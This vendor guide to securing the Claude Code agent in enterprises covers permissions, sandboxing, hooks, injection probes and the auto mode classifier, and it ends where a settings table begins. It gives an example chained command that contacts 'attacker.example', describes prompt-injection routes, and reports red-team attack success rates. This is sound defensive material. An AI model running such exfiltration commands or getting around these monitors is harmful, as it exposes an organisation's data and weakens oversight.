# The enterprise guide to securing coding agents

How security and technical leaders can understand and bound risk as they scale Claude Code

- Category[Best practices](https://claude.com/resources/best-practices)
- ProductClaude Code
- DateNovember 23, 2026
- Reading time18 min
- ShareCopy link

## Shipping fast and secure

Coding agents likely write code and open pull requests at your organization already. For many leading enterprises, they are reviewing, testing, and merging it too.

For example, after standardizing on Claude Code across its engineering organization, [Salesforce](https://www.salesforce.com/news/stories/how-engineering-became-agentic/)¹ [reported](https://www.salesforce.com/news/stories/how-engineering-became-agentic/):

79%

more pull requests merged per developer at Salesforce

5%

fewer total incidents at Salesforce

As agents do more, technical and security leaders must mitigate risks like prompt injection and privilege abuse with layered controls such as checked permissions and bounded environments.

The first two chapters focus on scoping the risk. We discuss the requirements every AI provider should meet and four agentic risks to mitigate.

The next three chapters focus on bounding the risk. We highlight the defensive layers you can deploy with Claude Code as well as how to centrally manage and enforce those controls.

This guide aims to provide a helpful agent security framework that can give organizations the confidence and trust to run agents effectively at scale.

![Diagram of the components of defending an AI agent: external checks on inputs, a probabilistic model inside an environment with a hard ceiling, and external checks on actions going out.](https://assets.claude.com/6e6e1d5218174690c704d9ddebd647dabd6c2f9b.png)

The components of defending an AI agent: the model, the environment around it, and external checks on what goes in and what comes out.

Companion guide

### How this guide fits with the AI-Native SDLC Playbook

This guide has a companion. The [AI-Native SDLC Playbook](https://cdn.prod.website-files.com/6889473510b50328dbb70ae6/6aba736348bdf4f08183f463_AI%20Native%20SDLC%20Playbook_designv2%20%281%29.pdf) covers how to redesign software development around agents, stage by stage from planning to maintenance. This guide covers the security controls underneath that work.

Read the playbook to decide where agents fit in your lifecycle. Read this guide to decide what they’re allowed to do when they get there.

[Read the AI-Native SDLC Playbook](https://cdn.prod.website-files.com/6889473510b50328dbb70ae6/6aba736348bdf4f08183f463_AI%20Native%20SDLC%20Playbook_designv2%20%281%29.pdf)

*This guide is written for organizations on Claude Team and Enterprise plans. If you reach Claude through a cloud provider such as AWS, Google Cloud, or Microsoft Azure, the same principles and local controls apply.*

## 01 Setting the bar for agent security

Six questions for every coding agent · Applying SaaS requirements to your AI provider

![](https://assets.claude.com/12c9aca44d78efd023bb5d03ab3cc795f6b47688.jpg?w=168&q=75&fm=webp&fit=max)
> “A CISO's responsibility in the age of agentic AI is not to achieve zero risk. Instead, our jobs are to make agentic risk legible and bounded. This way, we can deliberately accept what we can manage, so the business moves on our terms instead of around us.”

[Jason Clinton](https://claude.com/resources/articles/ciso-guide-to-agentic-ai), Deputy CISO at Anthropic

### Six questions for every coding agent

Here are six questions leaders can ask when evaluating coding agents to verify they are enterprise ready.

<table class="DataTable-module-scss-module__1wNx5a__table"><thead><tr><th class="DataTable-module-scss-module__1wNx5a__cell DataTable-module-scss-module__1wNx5a__headerCell text-body-2-serif" scope="col"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Question to ask</span></th><th class="DataTable-module-scss-module__1wNx5a__cell DataTable-module-scss-module__1wNx5a__headerCell text-body-2-serif" scope="col"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Why you should care</span></th><th class="DataTable-module-scss-module__1wNx5a__cell DataTable-module-scss-module__1wNx5a__headerCell text-body-2-serif" scope="col"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Good answer</span></th><th class="DataTable-module-scss-module__1wNx5a__cell DataTable-module-scss-module__1wNx5a__headerCell text-body-2-serif" scope="col"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Weak answer</span></th></tr></thead><tbody><tr><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock"><strong>Does the model refuse when it should?</strong></span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">The model is the first check on a harmful request, making a bad action less likely.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Refusal trained into weights, with published rates.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">"Our system prompt instructs the model to decline."</span></td></tr><tr><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock"><strong>Are actions automatically inspected outside the model before they run?</strong></span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">External checks can catch when the model is tricked or using bad judgment.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Static analysis of commands and a separate evaluator model. Prompt injection probes.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">"The model is very capable."</span></td></tr><tr><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock"><strong>Is blast radius bounded by the environment?</strong></span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">This bounds the severity, and therefore risk, of an incident.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Kernel-level sandboxing that admins can require and set to fail closed, or an isolated VM for each session. Egress allowlisting at the network layer.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">"The agent is instructed not to leave the working directory."</span></td></tr><tr><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock"><strong>Can policy be locked centrally?</strong></span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Sets minimum standards that can’t be undone by individuals.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Managed settings with hard-deny rules a local user can't override.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">“Per-developer config files, and an honor system policy doc.”</span></td></tr><tr><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock"><strong>Is the code the agent writes secure?</strong></span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Code volume is scaling and vulnerabilities can ship unless checks scale with the volume.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Automated security review with a person approving high-risk changes.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">“The model is trained to write secure code.”</span></td></tr><tr><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock"><strong>Can you reconstruct an incident?</strong></span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Compliance. Improving security over time.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Session <a href="https://code.claude.com/docs/en/monitoring-usage">telemetry export</a>, <a href="https://platform.claude.com/docs/en/manage-claude/compliance-api">audit API</a> (Enterprise), and named known gaps.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">"Logs are available on request."</span></td></tr></tbody></table>

### Applying SaaS requirements to your AI provider

You already have a SaaS provider checklist with controls such as single sign-on, role-based access, data handling terms, and audit logs. Hold AI providers to a similar checklist. For example, Claude Code supports these security expectations through:

- **Single sign-on and role-based access control** (Enterprise), managed the way you manage your other enterprise tools.
- **We don’t train generative models on code or prompts** under our commercial terms, unless your organization has chosen to share that data with us.
- **Enterprise Frontier Safeguards (rolling out in phases)** combines the privacy of zero data retention with state-of-the-art safeguards for detecting misuse across highly capable models. Data can be encrypted with your own keys and kept in storage you control for a limited time. [Learn more](https://www.anthropic.com/news/enterprise-frontier-safeguards).
- On Enterprise, **BAA** coverage for the Claude Code CLI and the desktop app’s Code tab in local mode, once the HIPAA configuration is applied.
- **Encryption options** on cloud platforms: customer-managed keys in AWS KMS on Amazon Bedrock, CMEK on Google Cloud, or Microsoft Foundry’s Hosted on Azure option.
- A **SOC 2 Type 2 report and ISO 27001 certificate** in the [Anthropic Trust Center](https://trust.anthropic.com/).

For security teams

### Getting cleared for security work

The [Cyber Verification Program](https://www.anthropic.com/news/cyber-verification-program) (CVP) makes advanced cyber capabilities and reduced blocking classifiers available to qualifying security professionals.

[Enterprise Frontier Safeguards](https://www.anthropic.com/news/enterprise-frontier-safeguards) is designed to let eligible organizations store data in cloud infrastructure they control.

## 02 Identifying AI-specific risks

Leaked credentials and privilege abuse · Unvetted dependencies and extensions · Data exfiltration · Prompt injection

Security and technical leaders are familiar with risks like leaked credentials, abused privileges, compromised dependencies, and insider threats. However the attack surfaces, velocity, and scale all change when it comes to agents. Let’s look at some of the risks.

<table class="DataTable-module-scss-module__1wNx5a__table"><thead><tr><th class="DataTable-module-scss-module__1wNx5a__cell DataTable-module-scss-module__1wNx5a__headerCell text-body-2-serif" scope="col"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Risk</span></th><th class="DataTable-module-scss-module__1wNx5a__cell DataTable-module-scss-module__1wNx5a__headerCell text-body-2-serif" scope="col"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">How you handle it today</span></th><th class="DataTable-module-scss-module__1wNx5a__cell DataTable-module-scss-module__1wNx5a__headerCell text-body-2-serif" scope="col"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">What changes with an agent</span></th></tr></thead><tbody><tr><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock"><strong>Leaked credentials and privilege abuse</strong></span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Least privilege, short-lived tokens, keyless auth through workload identity or OIDC. Regular review of over-privileged accounts.</span><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Named accounts for people, per-workload identity for software.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Credentials should be short-lived and scoped to the task or job, not the developer’s full access.</span><span class="DataTable-module-scss-module__1wNx5a__cellBlock">The agent acts inside a developer’s session and most logs outside Claude Code only show the developer’s name.</span></td></tr><tr><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock"><strong>Unvetted dependencies and extensions</strong></span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Pinned versions, review gates, two reviewers on manifest changes. Version controlled configuration.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Agents add both vetted and unvetted dependencies faster than manual processes. Extensions instruct the agent the moment they connect.</span></td></tr><tr><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock"><strong>Data exfiltration</strong></span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Egress allowlisting at the network layer.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">A compromised agent can send data out through services you already allow. Unlike traditional malware, it can try multiple routes the attacker doesn’t have to proactively define.</span></td></tr><tr><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock"><strong>Insider risk</strong></span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Social engineering awareness training, verification, reporting paths.</span></td><td class="DataTable-module-scss-module__1wNx5a__cell text-body-3"><span class="DataTable-module-scss-module__1wNx5a__cellBlock">Prompt injection: The check moves to the tool call and the network boundary.</span></td></tr></tbody></table>

### Risk 1: Leaked credentials and privilege abuse

Anything an agent can read, it can leak. That includes credentials like a long-lived AWS access key or GitHub token.

How to mitigate

Remove standing secrets from the agent’s environment. Keyless authentication through workload identity or OIDC gives the agent a short-lived token per job or session, so there’s no long-lived key to leak. Where a token has to exist, keep its lifetime short and its scope narrow. Use hooks to block commits that contain secrets and turn on secret scanning at push. On a developer’s machine, the sandbox can hide credentials from commands. A cloud session can’t read the developer’s machine, so the only secrets in the VM are ones you place there, such as environment variables or files in an uploaded repository.

Anything the agent can do, a compromised or overeager agent can misuse. By default, an agent in Claude Code runs under the identity of the developer who oversees it. In the event of an incident, you may need to distinguish between agent and developer actions so you can appropriately respond.

How to mitigate

Apply [least agency](https://claude.com/resources/articles/ciso-guide-to-agentic-ai), which is [least privilege](https://csrc.nist.gov/glossary/term/least_privilege) for agents. [Check tool calls against policy outside the model](https://code.claude.com/docs/en/permissions), so a request beyond the initiating user's or the task's permissions can be rejected by your rules. Audit agent identities on the same schedule as your other over-privileged and inactive accounts.

Keep session transcripts and [export OpenTelemetry data](https://code.claude.com/docs/en/monitoring-usage), so you can see what the agent did and read. In your CI/CD pipeline, give the agent its own identity, one you can scope and revoke without touching any developer’s account. [You can do this with Claude Code’s GitHub Action, which runs as its own GitHub App.](https://code.claude.com/docs/en/github-actions)

![Illustrative pull request conversation in which Claude, running as its own GitHub App, adds two verified commits and a comment under its own name rather than the developer’s account.](https://assets.claude.com/8311ac4c1e71b90b235793fe80369f9425177775.png)

Illustrative example of a pull request conversation. In the pipeline, the agent’s work arrives under its own name.

### Risk 2: Unvetted dependencies and extensions

Agentic coding accelerates the rate at which code is generated and reviewed, which includes the speed at which dependencies are added and configuration changes are made.

When you ask an agent to add JSON schema validation, it will find a package, add the latest version, and have working code in minutes. That speed can be a risk if agents aren’t pointed in the right direction.

MCP servers, plugins, skills, subagent definitions, and a repository’s `CLAUDE.md` file are dependencies too, and they deserve the review you give a package. Unlike a compromised library, which waits to be called, they reach the agent as soon as they load. Their descriptions and instructions enter the context window before the agent has done any work.

How to mitigate

Point agents at an internal registry of vetted packages, and use the egress allowlist to make it the only one they can reach. Cloud sessions allow public registries by default, so set network access on your shared environments to match, or use self-hosted environments (public beta) if the registry sits on your private network. Pin dependencies to specific versions, with automated upgrade pull requests so security patches still land quickly. Handle MCP servers, plugins, and skills the same way, and use marketplace allowlisting.

On Enterprise plans, [skill and plugin scanning](https://support.claude.com/en/articles/15927065-get-started-with-skill-and-plugin-scanning) checks third-party skills and plugins for malicious content when someone uploads or edits them in your organization.

![Illustrative admin view of a plugin that failed the security scan on an Enterprise plan, with a message saying it can’t be used and why.](https://assets.claude.com/bc8564043d89e3be8aa0b40630b189c53486bb08.png)

Illustrative example of what an admin sees when skill and plugin scanning blocks a plugin on an Enterprise plan.

### Risk 3: Data exfiltration

Every leak needs a route out. The challenge is a domain allowlist can't tell your account from an attacker's account. For example, if you allow github.com, then the agent can push to a repository the attacker owns.

DNS is a second possible exfiltration route that HTTP allowlists miss as data can be encoded into the names an agent looks up.

And of course once a token has leaked, an attacker doesn't need the agent's network at all. They can use the credential from anywhere, so egress filtering never sees the request.

How to mitigate

Allowlist destinations per agent, as narrowly as your proxy supports, down to the organization or path where it can. Route the agent's DNS through a resolver you filter and log. Limit cloud storage access to expected roles and IP ranges, and use data loss prevention to flag secrets and sensitive data leaving in uploads. In Claude Code cloud sessions, the allowlist is the environment’s network access setting, which works by domain. If you need your own proxy, DNS filtering, or inspection in the path, run sessions in [self-hosted environments](https://code.claude.com/docs/en/self-hosted-environments) (public beta).

### Risk 4: Prompt injection

OWASP has ranked prompt injection as the top risk in every edition of its [Top 10 for LLM Applications](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/) since the list began in 2023.

Social engineering and prompt injection work the same way. Social engineering gets past technical controls because the deceived person takes the action and the system sees an authorized request. An injected agent also acts with its own permissions with every log showing a legitimate request.

For a coding agent, that prompt injection can happen multiple ways including via:

- Issue trackers and pull request comments;
- Dependency READMEs and changelogs;
- Web pages the agent fetches;
- Responses from MCP tool calls;
- Comments in source files; and more.

How to mitigate

No single control stops prompt injection, so the defense has to be layered. This includes checks that judge what the agent reads and what it’s about to do, and fixed boundaries that limit the damage it could potentially inflict. This guide explores this in depth in subsequent sections.

![Flow diagram of the five things a hidden instruction in a web page has to get past: content read separately, injection probes, Claude’s training, the auto mode classifier, and the sandbox with masked credentials.](https://assets.claude.com/a908873f0456683f1b98ad867f1f1defe6363a68.png)

What a hidden instruction in a web page has to get past before it can do damage.

## 03 The judgment layer

Defending in layers · Understanding alignment training · Prompt injection probes · The auto mode classifier

### Defending in layers

In Claude Code, a compromised or misaligned agent has to get past multiple controls and two layers of defense before it can do damage.

The first layer is judgment-based. These controls decide whether something looks wrong.

1. **Alignment training** teaches Claude to refuse malicious requests and favor cautious actions.
2. **Prompt injection probes** scan incoming tool results in auto mode before Claude acts on them and flag content that looks like an injected instruction.
3. **The auto mode classifier** checks most proposed tool calls against the intent the user stated.

The second layer enforces fixed boundaries by limiting what any command can do:

1. **Permission rules, command analysis, and hooks** check each action against the rules you set before it runs.
2. **Sandboxing and egress allowlisting** limit what a permitted command can touch and where data can go.

This chapter covers the judgment layer and the next will examine the fixed boundary layer.

### Understanding alignment training

Claude is trained toward [good judgment backed by a list of firm rules](https://www.anthropic.com/constitution) like don't write malicious code that can cause significant damage.

[In Claude Code testing](https://www.anthropic.com/document/claude-fable-5-2-mythos-5-2-system-card) without production safeguards, current Claude models refused **81% to 85%** of malicious requests while completing **98% to 100%** of dual-use and benign ones, such as running reconnaissance tools or testing a site for vulnerabilities.

Claude is also trained to [prefer cautious actions over irreversible ones](https://www.anthropic.com/constitution), and to raise concerns or ask for guidance rather than improvise. Claude is trained not to act on instructions inside fetched content as if they came from the user.

Keep in mind, model alignment training makes a bad outcome less likely, but it doesn’t limit how bad that outcome can be.

By the numbers

### How Claude holds up under indirect prompt injection

Gray Swan, a third-party AI security firm, runs a benchmark for indirect prompt injection: the attack where instructions are planted in content an agent reads during a task, such as a web page, a file, or a tool result.

Attackers get up to 15 tries per scenario to find wording that works, and the score is the share of scenarios where any attempt succeeded. With prompt injection probes off, Claude Opus 5.5 scored 1.0% and Claude Fable 5.2 scored 4.1%. Most successful attacks on Fable 5.2 hit requests a safety classifier had rerouted to an older model ([system card](https://www.anthropic.com/document/claude-fable-5-2-mythos-5-2-system-card)).

### Prompt injection probes

Claude’s prompt injection probe is designed to flag any suspected injected instructions in tool results.

The probe adds a warning beside the injected instruction to tell Claude the content is suspect and that the user’s original request is still the task. Warning and anchoring lets Claude use the content while treating the instructions in it as data rather than commands.

By the numbers

### What the probes catch

Anthropic uses [Gray Swan’s Shade](https://www.grayswan.ai/solutions/platform/shade) to test Claude in coding environments, giving an attacker 200 tries at each of 40 scenarios. [In the November 2026 system card](https://www.anthropic.com/document/claude-fable-5-2-mythos-5-2-system-card):

- **Claude Fable 5.2**: probes cut successful attacks by about two-thirds, from 89.8% to 28.2%.
- **Claude Opus 5.5**: probes cut successful attacks by about four-fifths, from 54.6% to 11.1%.

### The auto mode classifier

A model that’s been convinced that deleting a directory is a legitimate task will delete it with the same thoroughness and competence it brings to everything else.

This sort of destructive, overeager action is exactly what the [auto mode classifier](https://code.claude.com/docs/en/auto-mode-config) was built to catch. For actions your rules and built-in approvals don’t already decide, the auto mode classifier judges whether the proposed action matches the intent of the developer’s instructions.

![Flow diagram of how the auto mode classifier decides whether a proposed action runs: rules and routine actions are resolved first, everything else goes to the classifier, which sees only the user’s request and the proposed action.](https://assets.claude.com/e2f7188da798d7c2235413a20109ef981ccf04ff.png)

How the auto mode classifier decides whether a proposed action runs.

For example, a command that makes sense for "fix the failing test in auth\_test.py" looks different from one for "exfiltrate the contents of .env.”

Tool results are stripped from the classifier requests Claude Code sends, so injected text can’t manipulate the classifier directly. If the action fits what the user asked for, it runs. If not, it's blocked or Claude goes back to ask the developer for permission.

By the numbers

### Auto mode under attack

In a July 2026 study paid for by Anthropic, Trajectory Labs, an independent testing firm, ran [72 indirect prompt injection scenarios ten times each against the versions of each agent publicly available as of July 17, 2026](https://claude.com/resources/articles/auto-mode-default-in-claude-code).

- Zero of 720 attempts succeeded against Claude Code in auto mode, across Claude Fable 5, Opus 5, and Sonnet 5.
- Against OpenAI’s Codex running GPT-5.6 Sol, 5.83% prompt injection attempts succeeded in Codex’s own automated review mode and 19.03% in full-access mode.

These tests covered the agents themselves, not browser extensions or other product safeguards.

Auto mode is now the [default starting mode](https://code.claude.com/docs/en/permission-modes) for interactive sessions on every plan. Headless `claude -p`, Agent SDK, and HIPAA configuration default to manual.

Auto mode is the default because [multiple tests](https://claude.com/resources/articles/auto-mode-default-in-claude-code) showed it catches more dangerous actions than human approval does. For example, in a controlled study Anthropic published in August 2026, 1,053 paid testers caught 13.6% of dangerous commands, and auto mode blocked 89% of the same commands.

![Bar chart of dangerous commands caught: 13.6% by human review and 89% by auto mode.](https://assets.claude.com/0e0f4605392016086364837ea880cb4d898c796c.png)

Dangerous commands caught by human review and by auto mode. Source: a controlled study of 1,053 paid testers, who were blind to the specific behavior under test.

[Configuring auto mode](https://code.claude.com/docs/en/auto-mode-config) covers tuning the classifier and overriding its block and allow rules.

#### Approving high-stakes actions

Auto mode relies on classification systems and does not eliminate all risk.

Before rollout, identify high-stakes actions by asking, is this action irreversible, and would a single mistake cost more than having a person review every instance? When the answer is yes to both, require human approval.

For most organizations the list looks like this:

- Production database migrations
- Changes to IAM policy, and credential rotation
- Edits to infrastructure definitions

## 04 Enforcing fixed boundaries

Setting permission rules · Bash command analysis · Gating actions with hooks · Containing agent actions with sandboxing

The judgment layer is good at catching novel attacks, but its controls are probabilistic, so each one has the chance of being beaten.

The fixed boundary layer can be made deterministic and sets an agent’s blast radius. Permission rules, command analysis, and hooks decide whether an action runs and the sandbox along with egress allowlists limit what can be reached and where data can go.

Their limitation is that they only block what you tell them to block, so they need to be set up with your environment in mind.

### Setting permission rules

Permission rules come in three kinds:

- `Allow` rules let an action run,
- `Ask` rules prompt a person before an action runs, and
- `Deny` rules block the action.

Claude Code first checks [deny rules, then ask rules, and finally allow rules](https://code.claude.com/docs/en/permissions). This prevents an allow rule from creating an exception to a deny rule. A deny rule defined in managed settings can’t be overridden by any user or project setting. You want to avoid allow rules for any command broad enough to run arbitrary code, such as `Bash(python:*)`.

![Flow diagram showing Claude Code checking deny rules first, then ask rules, then allow rules, with the permission mode deciding when no rule matches.](https://assets.claude.com/8a7da8abca173526f9f3c704f965406fd67180b1.png)

Claude Code checks deny rules first, then ask rules, then allow rules, so an allow rule can’t create an exception to a deny rule.

[Subagents](https://code.claude.com/docs/en/sub-agents) inherit the parent session's permission rules and permission mode, so a broad rule written for the top-level session applies to every agent it delegates to.

Pro tip

Use permission rules for a hard yes or no that you can write as a pattern on a tool, path, or command, such as “never read credential files” or “always ask before `terraform apply`.”

### Bash command analysis

Claude Code parses every Bash command before it runs. Without parsing, a [permission rule](https://code.claude.com/docs/en/permissions) allowing git status would also approve git status && curl attacker.example, and wrapping a denied command in a subshell would get it past the rule.

![Diagram showing Claude Code splitting the command git status && curl attacker.example into two parts and checking each against the rules: git status runs, curl is stopped for review.](https://assets.claude.com/3eb8a4dc0caccee702f17909b923bd4f36ab88e3.png)

Claude Code splits a command into its parts and checks each one against your rules.

Parsing is deterministic, so the same command gets the same answer every time. Deny and ask rules apply to each part of a command in every permission mode, including `bypassPermissions`.

Pro tip

Command rules match what the agent types, so back them with the sandbox and egress allowlist. For a check that needs logic, such as inspecting what a commit contains, use a hook.

### Gating actions with hooks

A [hook](https://code.claude.com/docs/en/hooks) is a script, HTTP endpoint, or MCP tool that Claude Code runs automatically at a fixed point in a session. Two that are particularly important for security are:

- **`PreToolUse`** runs before a tool call and can block it, approve it, ask a developer, or (in headless runs) defer it for approval later. For example, you may want to block a commit that contains a secret.
- **`ConfigChange`** runs when a settings file changes mid-session and can reject the change. This is how you identify when a repository or developer is trying to loosen a control locally.

Hooks sit inside the fixed boundaries rather than above them. A PreToolUse hook can block a tool call, but a hook returning `"allow"` can’t approve past a deny rule, an ask rule, or a critical-path deletion.

Hooks defined in managed settings run on every machine and individual developers can’t remove them. [`allowManagedHooksOnly`](https://code.claude.com/docs/en/hooks) goes further and prevents user, project, and plugin hooks from running at all, so a hook that reaches the agent is one your platform team put there.

Pro tip

By default, a hook that fails or times out lets the call through. Set `onFailure` to “block”, and use hooks for rules you need enforced that can’t be written as a permission pattern, such as “no commit may contain a string that looks like a key.” Avoid them for checks that a permission rule already covers.

### Containing agent actions with sandboxing

Sandboxing is one of the most important ways to contain the severity of an incident because it limits the agent’s scope. But containing agents is easier said than done, as constraint and capability are often inversely correlated.

There are three main Claude Code environments: local, local with sandbox, and cloud.

We’ll discuss the default settings and how to consider which is appropriate for each of the use cases within your organization. The defaults can be modified and locked centrally, which is covered in the next chapter.

#### Local

Most Claude Code sessions happen locally via the terminal, IDE, or desktop app. By default, the agent can access anything on your computer that you can. In auto mode, the classifier reviews actions your rules and built-in approvals don’t already decide.

This is the least contained environment and appropriate for low-stakes, self-contained work. For most enterprise organizations, we recommend enforcing the sandbox for local sessions.

#### Local sandbox

The Claude Code sandbox isolates each shell command at the operating system level, so commands can only change files in the project folder and connect to sites on the allowlist unless an exception is approved.

![Diagram of the local sandbox: commands can change the project folder, protected files stay locked, new websites go through a checkpoint, and everything else on the computer can’t be changed.](https://assets.claude.com/aabbaac0e88f3064fc95654d2bc63f5577613fb3.png)

Commands can change the project. Everything else meets a wall or a checkpoint.

By default, the developer or the auto mode classifier can approve agents to operate outside the sandbox or reach sites that aren’t on the allowlist if they deem it safe.

Using [managed settings](https://code.claude.com/docs/en/managed-settings) (more on this in the next chapter), admins can make local sandbox use mandatory, contain agent commands to that sandbox, and allow agents to [only visit centrally approved sites](https://code.claude.com/docs/en/sandboxing).

Once you’ve contained an agent to the sandbox, you don’t want it to escape by accessing credentials by reading files outside the project. To combat credential leaks, admins can add Read deny rules for the organization’s credential paths and also set [credential masking](https://code.claude.com/docs/en/sandboxing), which lets a command sign in without ever holding the real value.

Pro tip

Pair [strict sandbox mode](https://code.claude.com/docs/en/sandboxing) with `failIfUnavailable`. Without it, a sandbox that can’t start leaves commands running uncontained instead of refusing to run them.

Pro tip

The sandbox runs on macOS, Linux, and WSL2. It isn’t available on native Windows, so with `failIfUnavailable` on, Claude Code won’t start there. Run it inside WSL2, or try the [alpha Windows support](https://github.com/anthropics/sandbox-runtime) in the open source sandbox runtime, which can restrict file and network access.

#### Cloud sessions

[**Claude Code cloud sessions**](https://claude.dev/blog/claude-code-in-the-cloud/) run on an Anthropic managed environment with each task getting its own VM. Not only does this contain where Claude can execute, it also keeps GitHub credentials outside the VM.

Cloud sessions suit work that reads untrusted content or runs unattended. That’s because they are isolated from the developer’s machine and internal networks by default, and VMs can be discarded at any time.

![Anatomy of a Claude Code cloud session: each session runs in a fresh VM with a clone of the repository, while a GitHub proxy and a security proxy sit outside the VM.](https://assets.claude.com/44050228876da8e6828dcf77a83330fc9966e677.png)

Anatomy of a cloud session: each one runs in a fresh VM, and GitHub credentials stay outside the VM.

When a developer creates a new cloud environment, Claude starts with a limited set of [pre-installed tools and allowed domains](https://code.claude.com/docs/en/cloud-environments), although developers can add exceptions. Developers must select what repos will be cloned over every session.

![Illustrative settings dialog for a cloud environment, with network access, network secrets, setup script, and environment variables.](https://assets.claude.com/eaa627f67288a6d195be2c3f194138f6766064d9.png)

Illustrative example of the settings for a cloud environment.

Organization owners can set a default environment and publish shared environments with settings individual developers can’t change.

Developers can still create new environments and modify those environment settings. Organizations that need to lock this down host their own sessions, running Claude Code on infrastructure they launch and run, so they control the policy for those sessions.

Customer example

### How Stripe contains its coding agents

Stripe’s engineers work in isolated, disposable VMs called dev boxes, one per feature or branch. Its agents get a fresh one for every task and run Claude Code inside it. “The boxes don’t have access to any kind of production data, or indeed production services at all,” says co-founder and CEO Patrick Collison. “Even if you have a little catastrophic explosion, it’s fully contained.”

[Watch: Patrick Collison on Claude Code at Stripe](https://www.youtube.com/watch?v=S_lzYIvtEaQ)

Keep in mind, cloud sessions aren’t available to organizations that use zero data retention, the HIPAA configuration, or customer-managed encryption keys.

Pro tip

Give a session the keys it needs as [network secrets](https://code.claude.com/docs/en/cloud-environments), which stay outside the VM and are added only to requests for the sites you name.

## 05 Enforcing policy

Central settings at a glance · Which settings apply

We covered the default settings in previous chapters. The table below covers two additional configurations.

We’ve labeled one **baseline**, which you should choose when you want to create alternative defaults–or a starting point that individual developers can add to.

We’ve labeled the other **locked**, which is how admins can lock in a set of rules that can’t be changed at the developer level. Locking a setting is what turns a written policy into an enforced security control.

This is not an exhaustive list of settings, but rather those that focus on the key dimensions for bounding agent risk.

### Central settings at a glance

<table>
<thead><tr><th class="text-body-2-serif" scope="col"></th><th class="text-body-2-serif" scope="col"><span class="cst-p"><strong>Local sessions</strong></span><span class="cst-p">set in managed settings</span></th><th class="text-body-2-serif" scope="col"><span class="cst-p"><strong>Cloud sessions</strong></span><span class="cst-p">set in claude.ai admin settings</span></th></tr></thead><tbody>
